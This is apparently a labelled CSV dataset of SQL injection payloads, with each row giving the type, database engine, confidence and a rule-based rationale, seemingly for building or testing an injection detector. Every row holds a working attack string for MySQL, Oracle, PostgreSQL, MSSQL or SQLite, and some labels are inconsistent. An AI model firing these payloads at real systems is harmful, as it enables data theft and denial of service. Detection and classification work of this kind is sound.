id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
19371,"1%"" ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ""%"" = """,error_based,oracle,0.95,Token match 'utl_inaddr.get_host_address' (utl_inaddr.get_host_address) → error_based (P4); db=oracle,3
19372,"1' ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'isyg' = 'isyg",time_blind,sqlite,0.95,Token match 'randomblob (' (randomblob() → time_blind (P5); db=sqlite,2
19373,"1"" where 2989 = 2989 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.85,Token match 'generate_series (' (generate_series()) → heavy_query (P4); db=postgresql,3
19374,"-5024%"" or make_set ( 3321 = 7355,7355 ) and ""%"" = """,boolean_blind,mysql,0.85,Token match 'make_set (' (make_set()) → boolean_blind (P3); db=mysql,2
19375,"1"" ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( ""suxh"" = ""suxh",boolean_blind,mysql,0.9,"Token match 'elt ( 6237 = 6237' (ELT(N=N,...)) → boolean_blind (P3); db=mysql",2
19376,select ( case when ( 2593 = 3592 ) then 2593 else 2593* ( select 2593 from information_schema.character_sets ) end ) #,boolean_blind,mysql,0.9,CASE WHEN + tautology 'when ( 2593 = 3592' — boolean_blind inferential (P3); db=mysql,3
19377,"1 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) # couj",boolean_blind,mysql,0.85,"Token match 'elt ( 3484 = 3484' (ELT(N=N,...)) → boolean_blind (P3); db=mysql",2
19378,"1%' and make_set ( 8403 = 8403,8899 ) and '%' = '",boolean_blind,mysql,0.85,Token match 'make_set (' (make_set()) → boolean_blind (P3); db=mysql,2
19379,"1 ) ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.85,"Token match 'from all_users t1,all_users t2' (all_users t1,t2 cross-join), 'from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5' (5x cartesian join) → heavy_query (P4); db=oracle",1
19380,"1%' ) ) ) union all select null,null,null,null,null,null,null--",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19381,"1'|| ( select 'hdpi' where 5620 = 5620 and make_set ( 8403 = 8403,8899 ) ) ||'",boolean_blind,mysql,0.85,Token match 'make_set (' (make_set()) → boolean_blind (P3); db=mysql,3
19382,"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) )",time_blind,mysql,0.95,"Token match 'benchmark ( 5' (benchmark(N,...)) → time_blind (P5); db=mysql",2
19383,"-7381' ) ) or elt ( 5882 = 5919,5919 ) and ( ( 'nzri' = 'nzri",boolean_blind,mysql,0.85,"Token match 'elt ( 5882 = 5919' (ELT(N=N,...)) → boolean_blind (P3); db=mysql",2
19384,"1' ) where 5883 = 5883 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,mssql,0.85,"Token match 'from sysusers as sys1,sysusers' (sysusers cross-join (mssql)) → heavy_query (P4); db=mssql",1
19385,"1' ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,0.95,Token match 'dbms_pipe.receive_message' (dbms_pipe.receive_message) → time_blind (P5); db=oracle,3
19386,"-8256"" ) ) ) or 6872 = 6872 and ( ( ( ""lrtu"" = ""lrtu",boolean_blind,generic,0.85,Boolean tautology 'or 6872 = 6872' + injection break (quote/paren break) → boolean_blind (P3); db=generic,3
19387,"1' where 3339 = 3339 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",time_blind,mysql,0.95,"Token match 'benchmark ( 5' (benchmark(N,...)) → time_blind (P5); db=mysql",2
19388,select ( case when ( 2056 = 1917 ) then 2056 else 1/ ( select 0 ) end ) --,boolean_blind,generic,0.9,CASE WHEN + tautology 'when ( 2056 = 1917' — boolean_blind inferential (P3); db=generic,3
19389,"1%"" ) ) or sleep ( 5 ) #",time_blind,mysql,0.85,Token match 'sleep ( 5' (sleep(N)) → time_blind (P5); db=mysql,2
19390,"end and ( ( ( ""revx"" = ""revx",benign,generic,0.6,"No SQL injection signal (no tautology, no function, no break) — payload appears benign; db=generic",2
19391,"1%' union all select null,null,null,null--",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19392,"1%' or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",boolean_blind,generic,0.55,"Only comment tail detected, no tautology/function — likely simple probe; boolean_blind low-conf (P3); db=generic",2
19393,1%' ) ) rlike sleep ( 5 ) and ( ( '%' = ',time_blind,mysql,0.85,Token match 'sleep ( 5' (sleep(N)) → time_blind (P5); db=mysql,2
19394,"1"" ) ) as zval where 2255 = 2255 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",time_blind,mysql,0.85,Token match 'sleep ( 5' (sleep(N)) → time_blind (P5); db=mysql,2
19395,"1 ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users )",boolean_blind,mysql,0.9,CASE WHEN construct + REGEXP — inferential boolean_blind (P3); db=mysql,2
19396,"1' ) ) as bsvk where 5985 = 5985 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",boolean_blind,mysql,0.9,"Token match 'elt ( 7982 = 7982' (ELT(N=N,...)) → boolean_blind (P3); db=mysql",2
19397,select case when 8867 = 7630 then 1 else null end--,boolean_blind,generic,0.85,Token match 'case when 8867 = 7630 then' (CASE WHEN N=N THEN) → boolean_blind (P3); db=generic,3
19398,-4331 ) as inpx where 9804 = 9804 union all select 9804#,union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19399,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( 'egnv' like 'egnv",time_blind,mysql,0.95,"Token match 'benchmark ( 5' (benchmark(N,...)) → time_blind (P5); db=mysql",2
19400,"1 ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( 4450 = 4450",heavy_query,postgresql,0.85,Token match 'generate_series (' (generate_series()) → heavy_query (P4); db=postgresql,3
19401,"-4596"" union all select 5761#",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19402,"1"" where 5353 = 5353 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",boolean_blind,mysql,0.9,"Token match 'elt ( 8190 = 8190' (ELT(N=N,...)) → boolean_blind (P3); db=mysql",2
19403,"-6419 union all select 7008,7008,7008,7008,7008--",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19404,"-9180"" or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",boolean_blind,generic,0.9,CASE WHEN + tautology 'when ( 4232 = 4232' — boolean_blind inferential (P3); db=generic,2
19405,-8828 ) ) as ospo where 2141 = 2141 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,error_based,oracle,0.95,Token match 'utl_inaddr.get_host_address' (utl_inaddr.get_host_address) → error_based (P4); db=oracle,3
19406,"-3361 where 1335 = 1335 or elt ( 5891 = 5092,5092 ) --",boolean_blind,mysql,0.85,"Token match 'elt ( 5891 = 5092' (ELT(N=N,...)) → boolean_blind (P3); db=mysql",3
19407,1'+ ( select 'mdxt' where 2733 = 2733 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.95,Token match 'pg_sleep (' (pg_sleep() → time_blind (P5); db=postgresql,2
19408,"-5587%' ) or elt ( 1032 = 1032,3623 ) and ( '%' = '",boolean_blind,mysql,0.85,"Token match 'elt ( 1032 = 1032' (ELT(N=N,...)) → boolean_blind (P3); db=mysql",2
19409,"-6431' or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'ixix' like 'ixix",error_based,oracle,0.85,Token match 'ctxsys.' (ctxsys.drithsx.sn) → error_based (P4); db=oracle,3
19410,"1%"" ) ) union all select null,null,null,null,null,null,null,null--",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19411,"-7553%"" or 3571 = 2886",boolean_blind,generic,0.75,Boolean equality 'or 3571 = 2886' tautology pattern — boolean_blind (P3); db=generic,3
19412,1'|| ( select 'ydvg' from dual where 7108 = 7108,boolean_blind,oracle,0.85,Boolean tautology 'where 7108 = 7108' + injection break (quote/paren break) → boolean_blind (P3); db=oracle,3
19413,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'gtcb' = 'gtcb",heavy_query,mysql,0.85,Token match 'crypt_key (' (crypt_key()) → heavy_query (P4); db=mysql,2
19414,1'|| ( select 'adoe' from dual where 7662 = 7662,boolean_blind,oracle,0.85,Boolean tautology 'where 7662 = 7662' + injection break (quote/paren break) → boolean_blind (P3); db=oracle,3
19415,"-2453"" ) union all select 4520,4520,4520,4520,4520,4520,4520,4520,4520,4520--",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19416,1'+ ( select pagd where 2484 = 2484,boolean_blind,generic,0.85,Boolean tautology 'where 2484 = 2484' + injection break (quote/paren break) → boolean_blind (P3); db=generic,3
19417,"1' ) ) as lizu where 7691 = 7691 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",heavy_query,mysql,0.85,Token match 'crypt_key (' (crypt_key()) → heavy_query (P4); db=mysql,2
19418,"1 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )",benign,generic,0.6,"No SQL injection signal (no tautology, no function, no break) — payload appears benign; db=generic",1
19419,"1'+ ( select hspl where 4530 = 4530 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,oracle,0.85,"Token match 'from all_users t1,all_users t2' (all_users t1,t2 cross-join), 'from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5' (5x cartesian join) → heavy_query (P4); db=oracle",1
19420,"1', ( select ( case when ( 8382 = 8382 ) then 1 else 1/ ( select 0 ) end ) )",boolean_blind,generic,0.9,CASE WHEN + tautology 'when ( 8382 = 8382' — boolean_blind inferential (P3); db=generic,3
19421,1 ) ) as cwyb where 3633 = 3633,boolean_blind,generic,0.75,Boolean equality 'where 3633 = 3633' tautology pattern — boolean_blind (P3); db=generic,2
19422,"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19423,"1"" ) ) as pxdp where 4575 = 4575 and elt ( 8258 = 7218,7218 ) --",boolean_blind,mysql,0.85,"Token match 'elt ( 8258 = 7218' (ELT(N=N,...)) → boolean_blind (P3); db=mysql",3
19424,"1 ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",boolean_blind,mysql,0.85,"Token match 'elt ( 9173 = 9173' (ELT(N=N,...)) → boolean_blind (P3); db=mysql",2
19425,"1"" ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ""jfgk"" like ""jfgk",heavy_query,postgresql,0.85,"Token match 'from domain.domains as t1,domain.' (domain.* cross-join (postgresql)) → heavy_query (P4); db=postgresql",1
19426,"-5073"" ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ""kbab"" like ""kbab",boolean_blind,generic,0.9,CASE WHEN + tautology 'when ( 3440 = 3440' — boolean_blind inferential (P3); db=generic,3
19427,select ( case when ( 4774 = 1535 ) then 4774 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,error_based,oracle,0.85,Token match 'cast ( 1 as int' (cast(... as int)) → error_based (P4); db=oracle,1
19428,1' ) ) as hxxm where 3792 = 3792 and sleep ( 5 ) #,time_blind,mysql,0.85,Token match 'sleep ( 5' (sleep(N)) → time_blind (P5); db=mysql,2
19429,1' in boolean mode ) order by 1#,boolean_blind,mysql,0.85,"Token match 'in boolean mode' (IN BOOLEAN MODE (mysql fulltext)), 'order by 1#' (ORDER BY N -- probe) → boolean_blind (P3); db=mysql",1
19430,"1 ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,mssql,0.85,"Token match 'from sysusers as sys1,sysusers' (sysusers cross-join (mssql)) → heavy_query (P4); db=mssql",1
19431,"1%"" ) and 8626 = 3626#",boolean_blind,generic,0.85,Boolean tautology 'and 8626 = 3626' + injection break (comment tail) → boolean_blind (P3); db=generic,3
19432,"iif ( 5214 = 7412,1,1/0 )",boolean_blind,generic,0.85,"Token match 'iif ( 5214 = 7412' (iif(N=N,...)) → boolean_blind (P3); db=generic",1
19433,"1' ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( 'nuil' like 'nuil",time_blind,oracle,0.95,Token match 'dbms_pipe.receive_message' (dbms_pipe.receive_message) → time_blind (P5); db=oracle,3
19434,"1' ) ) ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,postgresql,0.85,"Token match 'from domain.domains as t1,domain.' (domain.* cross-join (postgresql)) → heavy_query (P4); db=postgresql",1
19435,1'|| ( select 'rhcv' where 6228 = 6228,boolean_blind,generic,0.85,Boolean tautology 'where 6228 = 6228' + injection break (quote/paren break) → boolean_blind (P3); db=generic,3
19436,select pg_sleep ( 5 ) and ( ( 4382 = 4382,time_blind,postgresql,0.95,Token match 'pg_sleep (' (pg_sleep() → time_blind (P5); db=postgresql,2
19437,"1' ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( 'oacz' = 'oacz",boolean_blind,mysql,0.85,Token match 'make_set (' (make_set()) → boolean_blind (P3); db=mysql,2
19438,"-6951"" union all select 2518,2518,2518,2518,2518,2518,2518,2518--",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19439,"1'+ ( select mems where 5091 = 5091 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) ) +'",boolean_blind,mysql,0.9,"Token match 'elt ( 7982 = 7982' (ELT(N=N,...)) → boolean_blind (P3); db=mysql",2
19440,"1 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) # cqqs",boolean_blind,mysql,0.85,"Token match 'elt ( 9173 = 9173' (ELT(N=N,...)) → boolean_blind (P3); db=mysql",2
19441,"1'|| ( select 'ltqo' where 9080 = 9080 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) ||'",time_blind,sqlite,0.95,Token match 'randomblob (' (randomblob() → time_blind (P5); db=sqlite,2
19442,"1'+ ( select 'otqy' where 2754 = 2754 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) ) +'",boolean_blind,mysql,0.9,"Token match 'elt ( 1808 = 1808' (ELT(N=N,...)) → boolean_blind (P3); db=mysql",2
19443,"1 ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( 3626 = 3626",boolean_blind,mysql,0.9,"Token match 'elt ( 7982 = 7982' (ELT(N=N,...)) → boolean_blind (P3); db=mysql",2
19444,"1' and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and 'qcsi' = 'qcsi",boolean_blind,mysql,0.9,"Token match 'elt ( 3393 = 3393' (ELT(N=N,...)) → boolean_blind (P3); db=mysql",2
19445,"1 ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( 5776 = 5776",boolean_blind,mysql,0.85,"Token match 'elt ( 3484 = 3484' (ELT(N=N,...)) → boolean_blind (P3); db=mysql",2
19446,"1 ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 9401 = 9401",boolean_blind,mysql,0.85,"Token match 'elt ( 3484 = 3484' (ELT(N=N,...)) → boolean_blind (P3); db=mysql",2
19447,1 rlike sleep ( 5 ) -- muhp,time_blind,mysql,0.85,Token match 'sleep ( 5' (sleep(N)) → time_blind (P5); db=mysql,2
19448,1 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) -- saxs,boolean_blind,mysql,0.9,Token match 'rlike (' (RLIKE () → boolean_blind (P3); db=mysql,3
19449,1 ) as ratg where 3033 = 3033 union all select null--,union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19450,-7404' where 1536 = 1536 order by 1#,boolean_blind,generic,0.85,Token match 'order by 1#' (ORDER BY N -- probe) → boolean_blind (P3); db=generic,2
19451,"1' ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19452,1 ) as cinw where 3732 = 3732 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.95,Token match 'pg_sleep (' (pg_sleep() → time_blind (P5); db=postgresql,2
19453,"1 union all select null,null,null--",union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19454,1' ) as rhvm where 1420 = 1420,boolean_blind,generic,0.85,Boolean tautology 'where 1420 = 1420' + injection break (quote/paren break) → boolean_blind (P3); db=generic,2
19455,"1' ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( 'edcm' like 'edcm",heavy_query,mssql,0.85,"Token match 'from sysusers as sys1,sysusers' (sysusers cross-join (mssql)) → heavy_query (P4); db=mssql",1
19456,-2756' where 6156 = 6156 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,error_based,oracle,0.95,Token match 'xmltype (' (xmltype() → error_based (P4); db=oracle,2
19457,1' ) union all select null#,union_based,generic,0.85,Token match 'union all select' (UNION SELECT) → union_based (P7); db=generic,3
19458,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) ) +'",time_blind,mysql,0.95,"Token match 'benchmark ( 5' (benchmark(N,...)) → time_blind (P5); db=mysql",2
